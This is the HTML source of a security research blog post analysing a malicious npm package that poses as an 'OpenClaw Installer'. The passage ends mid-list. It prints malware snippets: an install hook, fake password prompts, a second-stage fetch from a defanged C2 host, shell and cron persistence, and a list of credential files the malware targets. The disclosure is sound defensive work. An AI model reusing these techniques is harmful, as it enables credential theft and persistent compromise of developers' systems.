@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html data-html-server-rendered="true" lang="en" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22en%22%7D%7D">
+  <head>
+    <title>GhostClaw Unmasked: A Malicious npm Package Impersonating OpenClaw to Steal Everything - JFrog Security Research</title><meta name="gridsome:hash" content="3ec1a161bdd152114d7a53ef441236b07c651fdf"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.23"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="referrer" content="origin"><meta data-vue-tag="ssr" http-equiv="Content-Security-Policy" content="default-src *  &#x27;self&#x27; &#x27;unsafe-eval&#x27; &#x27;unsafe-inline&#x27;  https://jfrog.com; img-src &#x27;self&#x27; * data: ; font-src &#x27;self&#x27; * data: ;"><meta data-vue-tag="ssr" name="title" content="GhostClaw Unmasked: A Malicious npm Package Impersonating OpenClaw to Steal Everything | JFrog"><meta data-vue-tag="ssr" name="description" content="The JFrog Security research team has identified a malicious npm package named @openclaw-ai/openclawai. This package masquerades as a legitimate CLI tool called &quot;OpenClaw Installer&quot; while deploying a multi-stage infection chain that steals system credentials, browser data, crypto wallets, SSH keys, Apple Keychain databases, iMessage history, and more"><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.ebe1c983be3d8af04d6186b36f13b87c.png"><link rel="preload" href="/assets/css/0.styles.ab306386.css" as="style"><link rel="preload" href="/assets/js/app.6d2efe46.js" as="script"><link rel="preload" href="/assets/js/page--src--templates--real-time-post-vue.9720118d.js" as="script"><link rel="prefetch" href="/assets/js/page--src--pages--404-vue.9f141ac9.js"><link rel="prefetch" href="/assets/js/page--src--pages--index-vue.5a3c2803.js"><link rel="prefetch" href="/assets/js/page--src--pages--index-vue~page--src--pages--malicious-packages-vue.bcd39aa2.js"><link rel="prefetch" href="/assets/js/page--src--pages--malicious-packages-vue.20041e6d.js"><link rel="prefetch" href="/assets/js/page--src--pages--model-threats-vue.5d3ae52e.js"><link rel="prefetch" href="/assets/js/page--src--pages--oss-vue.8664726d.js"><link rel="prefetch" href="/assets/js/page--src--pages--post-vue.f747f1a2.js"><link rel="prefetch" href="/assets/js/page--src--pages--vulnerabilities-vue.9aa31a0d.js"><link rel="prefetch" href="/assets/js/page--src--templates--model-threats-post-vue.70bb558a.js"><link rel="prefetch" href="/assets/js/page--src--templates--post-vue.d2ee2512.js"><link rel="prefetch" href="/assets/js/vendors~page--src--pages--index-vue.2ec3d7ff.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--model-threats-post-vue~page--src--templates--real-time-post-vue.7f393094.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--real-time-post-vue.07e667fb.js"><link rel="stylesheet" href="/assets/css/0.styles.ab306386.css"><script data-vue-tag="ssr" src="/speedsize-local.js"></script><script data-vue-tag="ssr" src="https://transcend-cdn.com/cm/f0071674-c641-4cf3-9d31-303ec0c86b1b/airgap.js" data-languages="en" data-tracker-overrides="GoogleConsentMode:security_storage=on;ad_storage=SaleOfInfo,Advertising;ad_user_data=SaleOfInfo,Advertising;ad_personalization=SaleOfInfo,Advertising;analytics_storage=Analytics,SaleOfInfo;functionality_storage=Functional,SaleOfInfo;personalization_storage=Functional,SaleOfInfo" data-cfasync="false" type="text/javascript" charset="utf-8"></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8">
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+      gtag("config", "GTM-T6MF8M");
+      gtag('set', 'developer_id.dODQ2Mj', true);
+    </script><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
+  </head>
+  <body >
+    <div data-server-rendered="true" id="app" class="layout"><header class="py-2 main-header"><div class="container mx-auto px-2"><div class="flex w-full justify-between items-center"><div class="left"><div class="flex items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a><span class="site-name small">JFrog Security Research</span></div></div><div class="right"><div class="hidden sm:block desktop-menu-wrapper"><ul class="top-menu flex items-center"><li class="menu-item"><a href="/model-threats/" class="font-bold px-3">
+      Model Threats
+    </a><a href="/vulnerabilities/" class="font-bold px-3 mx-3">
+      Discover
+    </a></li><li><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noreferrer noopener noreferrer" class="sr-button px-3 py-2 inline-flex gap-2">
+  Follow JFrog Security
+  <img alt="twitter" src="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg" width="14" srcset="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg 14w" sizes="(max-width: 14px) 100vw, 14px" class="g-image"></a></li></ul></div><div class="sm:hidden flex item-center mobile-menu-wrapper gap-2"><!----><button class="show-menu-hamburger px-1"><img alt="Menu" src="/assets/static/hamburger.a58a0fd.dc5087fee70346d455e75c87bc430716.svg" width="22" srcset="/assets/static/hamburger.a58a0fd.dc5087fee70346d455e75c87bc430716.svg 22w" sizes="(max-width: 22px) 100vw, 22px" class="g-image"></button></div></div></div></div><div class="fixed mobile-menu h-screen w-screen z-50 bg-white text-gray-700 p-5 inset-0" style="display:none;"><div class="flex justify-end mb-3"><button class="p-3"><img alt="Menu" src="data:image/svg+xml,%3csvg fill='none' viewBox='0 0 12 12' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3e%3cdefs%3e%3cfilter id='__svg-blur-ed66a5bf1eb83ec14d27c7d6a4278d79'%3e%3cfeGaussianBlur in='SourceGraphic' stdDeviation='40'/%3e%3c/filter%3e%3c/defs%3e%3cimage x='0' y='0' filter='url(%23__svg-blur-ed66a5bf1eb83ec14d27c7d6a4278d79)' width='12' height='12' xlink:href='data:image/svg%2bxml%3bbase64%2ciVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAACXBIWXMAAAsTAAALEwEAmpwYAAAJfklEQVR42u2bCWwVVRSGpwtQWpa2UFpkEWRvUQFBNEqkFMoiIogKFWsFKiAYTTBRoiwulD0KERLBoKAiZRN3UCEiUUBFRWURBFxABCn70va1FM99fhOuw8xjmzd9yXOSP236%2bmbO%2bp9zz71jGOdf8YIWgk6CewU5gvsEPQRtBfUFVQUVjNC6KiBXfeTsgdw56NEJveIvdKNqgmaCdME9gmxBf0E3QRtBXUGcICrEDBCFXHWRsxtyZ6NHOnpVu9CNEgSpgs7cYKDgfkFPQXtBQ6xYSRAZIspHIk888rVH3vuRvz/6pKKf4xUjqCNoJ7hTkCt4VDBcMEDQVdBa0EBQS1BdUJnwiywHpSvw/OrI0wD5uiLvcOTPRZ926BdjzXl1g0Q%2bbCW4XTBUMEYwSZAnGCUYIugj6EiYNRGkkHvRHhsgmuemIEcb5OqDnKOQexJ6DEWvVuiZiN5%2bYmguSMNC6p%2bG8eVXBYsFiwSvCV4UPC14WNAPYmkpSBZU9NgAlVC%2bJXL0Qy4l3wvIuwj556LPMPRrh75KbyMDgugi6I2lJggWCNYIvhN8L9gg%2bESQL5gpGCcYzPcbQ0BeXlXwfAZyjEOufORcj9xK/s/QJw/9eqOv0ttvOVUmsgQPCcbieaX8TkGB4KjgoOA3wSbBKsGbgufINWXRJEGEh/mfxHMHIMebyLUJOQ8idwF6rEGvseiZRXUwHhQ8IBgkeEwwWbAEy6kvn9Xg4287BJ8TWo8LuguaklPRHuR%2bdZ7XnefPRZ4dyOezyF2APkvQ7zH0VXr7m4Us6uVwwn8x4XPUciOFUqy7RfC%2bYBoWzSCv6kCslV1slqI1tr%2bKctYJdp%2bGHFuQq9RG5mNExmL0G4G%2bSm9/x6SahjsIp1EQyAZueNYGhYK9gq8gmkkQkGLgWyAXRVCxLhkghjKnvH4zJc3kqnzk2ItcdvIe4n/mCZ6iP%2bhFBPnbxjY0D5l4U7Hox%2bSSz%2baGZ4iO3YJ1gmUQ0NM0Hp2pLoku8YIZ8ul4TjlpBiH9BTl%2bBLnsZN0DP8ygEnTDkEp3f%2b9cR2si%2bqDIQtJARUGJzY2LBIcFv2vEuACvKCN0ENRzoTyqFrc2Aivln8WTKwUbcUIB8th5XznqJ4ylCPBuFG%2bE7v5yEouVrxbchpVeEnwq2I4RTlvyq4zoOMXnO4mGBTQefQXXEgWXS4wRyNWCkB2F8orwtgn%2bEhwXFNt4v5io2EUFeFnwCNxxDXJVNQkmEk8lEQX3Yq03%2bPJmwugIeWZ9WAmfKSOsFsziYZkIn8IiJIbnRQRQOApZVF9Rk1qfTs5PF6xA%2bYPIUmZxSjFGUcb5WfAlPPE8hN8OeSpbHROBkI154CDC7RXBe5Ci2RcU24RaCUL9IFgumEokKXK9iRxOIeIiAxggFkc0IlS70eiY1WkjyhU6yKAc8Sv/t4KImUB73IUVYbxTVMYgZBqhoiw2EmUWQji7sXCZjQAqHf6AcZfhsSept525b1KAlIgkNJvR12dpz8/Xnn8swPN/x1lLad2f4PkqGq%2bjjMY6RaE5VEgmEnQP5F2CB1T1%2bBaims93c4mshoSf3VURYurAIOMZIvD9i4hAHxGoCPltwRTSpicR2AwyrRaImCPxjl0ODsGjKy8yB/dDoGYOPsu6vDX3jXKYRl0LgY4WvK5x0N4AHOTTOGgVHDSCkG%2bOQ6sS4Ze0dL9cFjYNcRgWVv8/hxY0E2/UwsiViIhE8j6dpmomyigi%2b9uhCpU4VCFlvLtYKSZc6fTqYuuwU0ocwoPv0IfnMrBoj7dbwA03wDsqX8dTt1UfcsChxptl7g%2bI19qH3Mp4zJV23K4Tmw4n6J1YqUPbvEfzzkRtMZJFye2H4sNZ2SneWAubn7S5ZxmR9xvcsJywH23pRBPcWoFZe/Fell58Azl62mHxdBg%2bWItnZ8PQk7nHRJhehf1b9BJbCW2fg/f3Q7RLIbwRhP2tWu/h1lrET4wxREJtHpBOdZgKS28mV4tsvFXIZ2q5%2bg0DCrXW%2bIAeQ%2bFDOs91KP8X%2bW3XdJkGXUEkDoPwWhL2CSgflNF9FIZoQokcSalaA2EdIGx9mvClKFNAzv4CiW6mT/%2bR37fBKeoeJ7Q1SBn3KIRTdlFd5lHne8L2CV7tV0RQytqSx89QslZBXL%2bi7CmUOMPP09p06QBhrDy9D%2bxHwROaAU3FD8Mlm6kqC%2bkvsiHUZK/3KuIoWx1pWkZDREvJdTOMTWVK%2bFmIYU6CExCaiVOkUYlW5v4m5NdRTWZTjcyZZBNzYePlZS6emtO59YXFx8PiJpGZKVGMAYq1333a34owTpH299OWEdwChi%2bPUjk6Mh1Kpp/wfCsqlgamPjU9nWh4DjZfTzoc0jzr09KiTEOpxSCFpMseiHMJFWMwhNeKGUZNotHrfQk/D0RoS%2bl4UiKDSJgFq28jt4%2bjlM%2bhXzDJsgQDnLJMdGdrnaQqxzWoTFHIEGGEwJVIR5dNefwAlt%2bHAYoCKK%2bPsPQWdztz/uk0T%2b1JvVDZlzyvYUqlu1MM/S5t6p8sYYsd5nZ2kWCSn4qgjzDoAJa0cUaIXhVY6PSFDN9heaoboOwSDbCVJmkyq8k06%2bZmOEZAlVA1gFccUMsIgQMaXlcBc57QlTSrqQ02y6UKlEcfMJE%2bIJPJUkMqQpXy6AO87gTX0glOphPsj8HT6AQ9J0av1wI7tLXAHNYCuQw/mhoXcfgplFaDBS6sBvOpNA8w9U3xKg1CaR4wn32HO7TN2IrBIMRgTIRWujARWqlNhDIh4noYwtWJkFszwc8ZpLo5E1zGd0dAxB2CMRN0cyo8ARYfaJw7p3MlU%2bGvtKnwGJqlLoaL5xPc3BeYpNXxGxliNrfsC%2bRc5r7Aas3AgwyXzie4uTM0G893IZqSCNGKQdgZuuzzCcHaG1xI5PSjg6vhsJ53Y29wtWVv0Ho%2bIeDeoNu7w%2bb%2bfB736Ej7GhPE3WHzfMIU47/nE5qxNV49UFq4dT7A3J%2bfztw%2bm0VSKlHl1fkA83xCDrxzvfHveag4uyhw%2b4SI6QHzmH0TIivO8PaEyHzj3AmRTMsGSoRhuH9GKND%2bfCWjfM8Imcd6a%2buNUjBOibm1Px%2bMU2IZRFcNcwHl9jnBPMPd/flgnRNsjMOv%2bKToesP5pKhb%2b/NunxTtbmgnRa/krPDXhvNZ4WQj9M4KK0J8CiP2Qvf/T4uH/fsC4fLGyGfoNcawvDES9u8Mhf1bY%2bHy3uAQw%2bG9QWu5Cbs3R61XWL87bBhh9vb4P/%2bX4wkCBpt7AAAAAElFTkSuQmCC' /%3e%3c/svg%3e" width="12" data-src="/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg" data-srcset="/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg 12w" data-sizes="(max-width: 12px) 100vw, 12px" class="g-image g-image--lazy g-image--loading"><noscript><img src="/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg" class="g-image g-image--loaded" width="12" alt="Menu"></noscript></button></div><ul class="mobile-menu-list"><li class="py-4 px-2 border-t border-gray-200"><a href="/" class="text-gray-700 active">
+        Home
+      </a></li><li class="py-4 px-2 border-t border-gray-200"><a href="/model-threats/" class="text-gray-700">
+        Model Threats
+      </a></li><li class="py-4 px-2 border-t border-gray-200"><a href="/vulnerabilities/" class="text-gray-700">
+        Discover
+      </a></li><li class="py-4 px-2 border-t border-gray-200"><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noopener" class="text-gray-700">
+        Follow JFrog Security
+      </a></li></ul></div></header><div class="latest-posts"><div class="container pt-5 pb-10"><h1 class="mt-3 pb-0">GhostClaw Unmasked: A Malicious npm Package Impersonating OpenClaw to Steal Everything</h1><p class="mt-1 mb-5 green">Meitar Palas, JFrog Security Researcher | 8 Mar, 2026</p><div class="post-content-wrapper real-time-theme"><section class="latest-posts-single-post-content text-black"><h1 id="ghostclaw-unmasked-a-malicious-npm-package-impersonating-openclaw-to-steal-everything"><a href="#ghostclaw-unmasked-a-malicious-npm-package-impersonating-openclaw-to-steal-everything" aria-hidden="true" tabindex="-1">GhostClaw Unmasked: A Malicious npm Package Impersonating OpenClaw to Steal Everything</a></h1>
+<p>The JFrog Security research team has identified a live malicious npm package named <code>@openclaw-ai/openclawai</code>. This package masquerades as a legitimate CLI tool called "OpenClaw Installer" while deploying a multi-stage infection chain that steals system credentials, browser data, crypto wallets, SSH keys, Apple Keychain databases, iMessage history, and more - then installs a persistent RAT with full remote access capabilities including a SOCKS5 proxy and live browser session cloning.</p>
+<p>The attack is notable for its broad data collection, its use of social engineering to harvest the victim's system password, and the sophistication of its persistence and C2 infrastructure. Internally, the malware identifies itself as <strong>GhostLoader</strong>.</p>
+<h2 id="package-delivery"><a href="#package-delivery" aria-hidden="true" tabindex="-1">Package Delivery:</a></h2>
+<p>The <code>package.json</code> presents a benign facade. <code>src/index.js</code> exports a decoy <code>useAsyncState</code> utility. The actual malicious logic is in the <code>scripts/</code> directory:</p>
+<pre><code class="language-json">{
+  "name": "@openclaw-ai/openclawai",
+  "version": "1.5.15",
+  "description": "🦞 OpenClaw Installer - Integration utilities",
+  "main": "src/index.js",
+  "types": "src/index.d.ts",
+  "files": [
+    "src",
+    "scripts/setup.js",
+    "scripts/postinstall.js",
+    "scripts/build.js"
+  ],
+  "bin": {
+    "openclaw": "./scripts/setup.js"
+  },
+  "scripts": {
+    "start": "node src/index.js",
+    "build": "node scripts/build.js",
+    "lint": "eslint src/**/*.js",
+    "test": "jest"
+  },
+  "license": "MIT",
+  "keywords": [
+    "utility",
+    "sdk",
+    "integration"
+  ],
+  "dependencies": {}
+}
+</code></pre>
+<p>The <code>postinstall</code> hook silently re-installs the package globally, ensuring the <code>openclaw</code> binary is placed on the system <code>PATH</code>:</p>
+<pre><code class="language-javascript">const { execSync } = require('child_process');
+execSync("npm i -g @openclaw-ai/openclawai", { stdio: 'inherit' });
+</code></pre>
+<p>This is the first trigger. Once globally installed, the <code>openclaw</code> binary points to <code>scripts/setup.js</code>, the obfuscated first-stage dropper.</p>
+<h2 id="stage-1-social-engineering-and-payload-delivery"><a href="#stage-1-social-engineering-and-payload-delivery" aria-hidden="true" tabindex="-1">Stage 1: Social Engineering and Payload Delivery</a></h2>
+<p><code>setup.js</code> is heavily obfuscated (string table shuffling, RC4 decoding, control flow flattening). When executed, it displays a convincing fake CLI installer with animated progress bars, spinners, and realistic system log output:<br>
+<img src="/img/RealTimePostImage/post/ghostclaw-unmasked/progress_bar.png"></p>
+<h3 id="credential-theft-via-fake-keychain-prompt"><a href="#credential-theft-via-fake-keychain-prompt" aria-hidden="true" tabindex="-1">Credential Theft via Fake Keychain Prompt</a></h3>
+<p>After the progress bars complete, the script displays a fake Keychain authorization prompt:</p>
+<pre><code>Keychain Authorization Required
+OpenClaw needs to securely store credentials in the macOS Keychain.
+Administrator privileges are required for the initial setup.
+This is a one-time operation for secure vault initialization.
+</code></pre>
+<p>The victim is prompted for their system password (up to 5 attempts). Each attempt is validated against the real OS authentication mechanism:</p>
+<pre><code class="language-javascript">// macOS
+spawnSync("dscl", [".", "-authonly", username, password], { stdio: "pipe", timeout: 5000 });
+
+// Windows
+spawnSync("powershell", ["-NoProfile", "-NonInteractive", "-Command",
+    "... $ctx.ValidateCredentials('" + username + "', '" + password + "') ..."]);
+
+// Linux
+spawnSync("su", ["-c", "true", username], { input: password + "\n", stdio: "pipe" });
+</code></pre>
+<p>Failed attempts show "Authentication failed. Please try again." - exactly mimicking real OS behavior.</p>
+<h3 id="encrypted-second-stage-download"><a href="#encrypted-second-stage-download" aria-hidden="true" tabindex="-1">Encrypted Second-Stage Download</a></h3>
+<p>While the user is distracted by the installer UI, the script concurrently fetches the second-stage payload from the C2 server. The URL and path are XOR-encoded as integer arrays to avoid static detection:</p>
+<pre><code class="language-javascript">var_60.map((val, i) => String.fromCharCode(val ^ var_61[i])).join("")
+// Decodes to: https://trackpipe.dev
+
+var_65.map((val, i) => String.fromCharCode(val ^ var_66[i])).join("")
+// Decodes to: fafc0e77-9c1b-4fe1-bf7e-d24d2570e50e
+</code></pre>
+<p>The full request goes to:</p>
+<pre><code>hxxps[://]trackpipe[.]dev/t/bootstrap?t=fafc0e77-9c1b-4fe1-bf7e-d24d2570e50e
+</code></pre>
+<p>The C2 returns a JSON response with two fields: (base64-encoded encrypted payload) and <code>k</code> (hex decryption key). The payload is decrypted using AES-256-GCM:</p>
+<pre><code class="language-javascript">const encrypted = Buffer.from(response.p, "base64");
+const key = Buffer.from(response.k, "hex");
+const iv = encrypted.slice(0, 16);
+const authTag = encrypted.slice(16, 32);
+const ciphertext = encrypted.slice(32);
+const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
+decipher.setAuthTag(authTag);
+let decrypted = decipher.update(ciphertext);
+decrypted = Buffer.concat([decrypted, decipher.final()]);
+</code></pre>
+<h3 id="detached-payload-launch"><a href="#detached-payload-launch" aria-hidden="true" tabindex="-1">Detached Payload Launch</a></h3>
+<p>The decrypted JavaScript is written to a temp file and spawned as a detached child process. The stolen password is passed via the <code>NODE_AUTH_TOKEN</code> environment variable, and the campaign identifier <code>complexarchaeologist1</code> is passed via <code>NODE_CHANNEL</code>:</p>
+<pre><code class="language-javascript">const tmpPath = path.join(os.tmpdir(), "sys-opt-" + crypto.randomBytes(6).toString("hex") + ".js");
+fs.writeFileSync(tmpPath, decrypted);
+
+const child = spawn(process.execPath, [tmpPath], {
+    stdio: "ignore",
+    detached: true,
+    env: {
+        ...process.env,
+        NODE_CHANNEL: "complexarchaeologist1",
+        NODE_AUTH_TOKEN: stolenPassword,
+        NPM_CONFIG_TAG: packageName
+    }
+});
+child.unref();
+
+setTimeout(() => { try { fs.unlinkSync(tmpPath); } catch {} }, 60000);
+</code></pre>
+<p>The temp file is deleted after 60 seconds. The <code>npm install</code> command completes normally while the payload continues running in the background.</p>
+<h3 id="full-disk-access-social-engineering-macos"><a href="#full-disk-access-social-engineering-macos" aria-hidden="true" tabindex="-1">Full Disk Access Social Engineering (macOS)</a></h3>
+<p>If the Safari directory is inaccessible (no Full Disk Access), the script displays an AppleScript dialog urging the user to grant FDA to Terminal, complete with step-by-step instructions and a button that opens System Preferences directly:</p>
+<pre><code class="language-javascript">spawn("osascript", ["-e", 
+    'display dialog "OpenClaw requires Full Disk Access..." ' +
+    'buttons {"Skip", "Open Settings"} with title "OpenClaw — Security Setup"'
+]);
+</code></pre>
+<p>This enables the second-stage payload to steal Apple Notes, iMessage, Safari history, and Mail data.</p>
+<h2 id="stage-2-ghostloader---the-full-payload"><a href="#stage-2-ghostloader---the-full-payload" aria-hidden="true" tabindex="-1">Stage 2: GhostLoader - The Full Payload</a></h2>
+<p>The second-stage payload is a ~11,700-line JavaScript bundle. It is a complete infostealer and RAT framework. The payload uses a CommonJS module format with <code>__esm</code>/<code>__commonJS</code> loaders, containing modules for persistence, data collection, browser decryption, C2 communication, a SOCKS5 proxy, and live browser cloning.<br>
+<img src="/img/RealTimePostImage/post/ghostclaw-unmasked/2nd_stage.png"></p>
+<h3 id="installation-and-persistence"><a href="#installation-and-persistence" aria-hidden="true" tabindex="-1">Installation and Persistence</a></h3>
+<p>On first execution, the payload installs itself permanently:</p>
+<p><strong>Self-installation.</strong> The script copies itself to a hidden directory disguised as an npm telemetry service:</p>
+<table>
+<thead>
+<tr>
+<th align="left">Platform</th>
+<th align="left">Install Path</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">macOS / Linux</td>
+<td align="left"><code>~/.cache/.npm_telemetry/monitor.js</code></td>
+</tr>
+<tr>
+<td align="left">Windows</td>
+<td align="left"><code>%APPDATA%/.npm_telemetry/monitor.js</code></td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-javascript">INSTALL_DIR_NAME = ".npm_telemetry";
+EXECUTABLE_NAME = "monitor.js";
+
+function installSelf() {
+    const installPath = getInstallPath();
+    if (!fs.existsSync(installPath)) fs.mkdirSync(installPath, { recursive: true });
+    fs.copyFileSync(process.argv[1], path.join(installPath, EXECUTABLE_NAME));
+}
+</code></pre>
+<p><strong>Shell hooks.</strong> Lines are appended to <code>~/.zshrc</code>, <code>~/.bashrc</code>, and <code>~/.bash_profile</code>, disguised as <code># NPM Telemetry Integration Service</code>. The hook checks a <code>.lock</code> PID file and re-launches the malware if it is not running:</p>
+<pre><code class="language-javascript">const hookCode = '([ -f "' + lockFile + '" ] &#x26;&#x26; kill -0 $(cat "' + lockFile + '") 2>/dev/null ' +
+    '|| nohup ' + process.execPath + ' "' + executablePath + '" >/dev/null 2>&#x26;1 &#x26;) 2>/dev/null';
+
+for (const rcFile of [".zshrc", ".bashrc", ".bash_profile"]) {
+    const content = fs.readFileSync(rcFile, "utf8");
+    if (!content.includes(executablePath)) {
+        fs.appendFileSync(rcFile, "\n# NPM Telemetry Integration Service\n" + hookCode + "\n");
+    }
+}
+</code></pre>
+<p><strong>Cron jobs (Linux).</strong> An <code>@reboot</code> cron entry is added to ensure the malware survives reboots:</p>
+<pre><code class="language-javascript">const cronLine = '@reboot ( [ -f "' + lockFile + '" ] &#x26;&#x26; kill -0 $(cat "' + lockFile + '") ' +
+    '2>/dev/null || ' + nodePath + ' "' + execPath + '" ) >/dev/null 2>&#x26;1';
+execSync("echo '" + existingCron + "\n" + cronLine + "' | crontab -");
+</code></pre>
+<p><strong>Background daemon.</strong> After installation, the malware spawns itself from the installed path as a detached process, then exits the original process:</p>
+<pre><code class="language-javascript">const child = child_process.spawn(process.execPath, [getExecutablePath()], {
+    detached: true,
+    stdio: "ignore"
+});
+child.unref();
+</code></pre>
+<h3 id="first-run-data-collection"><a href="#first-run-data-collection" aria-hidden="true" tabindex="-1">First-Run Data Collection</a></h3>
+<p>On the initial run, the <code>main()</code> function orchestrates a comprehensive data theft operation with a 10-minute hard timeout. It sends a "New Session" notification to Telegram containing the stolen password, hostname, IP, country, and system specs. Then it systematically collects:</p>
+<p><strong>macOS Keychain.</strong> Both the local <code>login.keychain-db</code> and all iCloud Keychain databases (including <code>-wal</code> and <code>-shm</code> journal files):</p>
+<pre><code class="language-javascript">const keychainPath = path.join(os.homedir(), "Library", "Keychains", "login.keychain-db");
+if (fs.existsSync(keychainPath)) copyToLoot(keychainPath, "Keychain/login.keychain-db");
+
+// iCloud Keychains: UUID directories containing keychain-2.db, user.kb, TrustedPeersHelper DBs
+</code></pre>
+<p><strong>Browser credentials (with decryption).</strong> If the system password was captured, the malware uses it to decrypt Chrome's <code>Safe Storage</code> key via macOS Keychain, then decrypts passwords, cookies, credit cards, and autofill data from all Chromium-based browsers (Chrome, Brave, Edge, Vivaldi, Opera, Yandex, Comet). Firefox passwords are decrypted via NSS/PKCS#12. The malware reports counts: <code>Decrypted: 42 pass, 3 cards, 128 autofill</code>.</p>
+<p><strong>CDP cookie theft.</strong> For cookies that resist SQLite extraction, the malware launches headless browser instances using Chrome DevTools Protocol, connecting via <code>-remote-debugging-port</code> to dump all cookies programmatically:</p>
+<pre><code class="language-javascript">async function stealCookiesViaCDP(browsers) {
+    const chromiumBrowsers = browsers.filter(b => b.type === "chromium");
+    for (const browser of chromiumBrowsers) {
+        const binary = findBrowserBinary(browser.name);
+        for (const profile of getProfiles(browser.path)) {
+            const port = await findAvailablePort(9222);
+            const cookies = await runCDPForBrowser(browser.name, binary, browser.path, port, profile);
+            // Exports in both Netscape and JSON formats
+        }
+    }
+}
+</code></pre>
+<p><strong>Crypto wallets.</strong> Desktop wallet applications and browser extension wallets are targeted:</p>
+<table>
+<thead>
+<tr>
+<th align="left">Platform</th>
+<th align="left">Wallets Targeted</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">macOS</td>
+<td align="left">Exodus, Electrum, Atomic, Bitcoin Core, Ledger Live, Sparrow, Wasabi, Trezor Suite</td>
+</tr>
+<tr>
+<td align="left">Linux</td>
+<td align="left">Same set, different paths</td>
+</tr>
+<tr>
+<td align="left">Browser Extensions</td>
+<td align="left">MetaMask, Phantom, Solflare, and others</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Seed phrase scanner.</strong> Files in <code>~/Desktop</code>, <code>~/Documents</code>, and <code>~/Downloads</code> are scanned for BIP-39 mnemonic seed phrases using a wordlist ratio check:</p>
+<pre><code class="language-javascript">function extractMnemonic(text) {
+    const words = text.toLowerCase().match(/[a-z]{3,8}/g);
+    if (!words || words.length &#x3C; 12) return null;
+    // Calculates ratio of BIP-39 matches
+    // Files with high ratios are copied to loot/Seeds/found/
+}
+</code></pre>
+<p><strong>SSH keys.</strong> The <code>~/.ssh/</code> directory is scanned for private keys (<code>id_rsa</code>, <code>id_ed25519</code>, etc.).</p>
+<p><strong>Developer and cloud credentials.</strong> A hardcoded list of sensitive files is exfiltrated:</p>
+<pre><code class="language-javascript">const targets = [
+    { path: "~/.aws/credentials",      name: "Cloud/AWS/credentials" },
+    { path: "~/.aws/config",           name: "Cloud/AWS/config" },
+    { path: "~/.azure/profiles.json",  name: "Cloud/Azure/profiles.json" },
+    { path: "~/.gcloud/credentials.db", name: "Cloud/GCP/credentials.db" },
+    { path: "~/.kube/config",          name: "Cloud/Kubernetes/config" },
+    { path: "~/.docker/config.json",   name: "Cloud/Docker/config.json" },
+    { path: "~/.npmrc",                name: "Dev/NPM/npmrc" },
+    { path: "~/.git-credentials",      name: "Dev/Git/git-credentials" },
+    { path: "~/.config/gh/hosts.yml",  name: "Dev/GitHub_CLI/hosts.yml" },
+    { path: "~/.config/solana/id.json", name: "Dev/Solana/id.json" },‎
+];
+</code></pre>
+<p>All environment variables are also dumped to <code>Environment.txt</code>.</p>
+<p><strong>AI agent configurations.</strong> The malware targets AI coding agent credential stores:</p>
+<pre><code class="language-javascript">var AI_AGENT_TARGETS = [
+    { name: "ZeroClaw", baseDir: ".zeroclaw", files: ["config.toml"], dirs: ["state"] },
+    { name: "PicoClaw", baseDir: ".picoclaw", files: ["config.json"], dirs: ["workspace/memory", "workspace/sessions"] },
+    { name: "OpenClaw", baseDir: ".openclaw", files: ["openclaw.json"], dirs: ["credentials"] }
+];
+</code></pre>
+<p><strong>FDA-protected data (macOS).</strong> If Full Disk Access was granted (checked by attempting to read <code>~/Library/Safari</code>), the malware collects:</p>
+<ul>
